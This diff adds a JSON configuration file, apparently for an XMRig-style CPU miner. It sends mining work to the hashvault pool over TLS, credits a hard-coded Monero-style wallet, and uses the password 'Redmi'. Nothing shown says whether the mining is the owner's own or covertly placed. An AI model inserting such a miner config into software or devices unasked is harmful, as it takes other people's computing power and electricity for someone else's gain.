@@ -1,0 +1,15 @@
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "url": "pool.hashvault.pro:443",
+            "user": "484U9WcTLRacUKLXkkgvRaKPimeQHer5whwAbTHH84MxNgwyjPxntnUeZy5nZYiwMv353AUQRqouDiaSuzEMf8oRH1WNdkB",
+            "pass": "Redmi",
+            "keepalive": true,
+            "tls": true
+        }
+    ]
+}
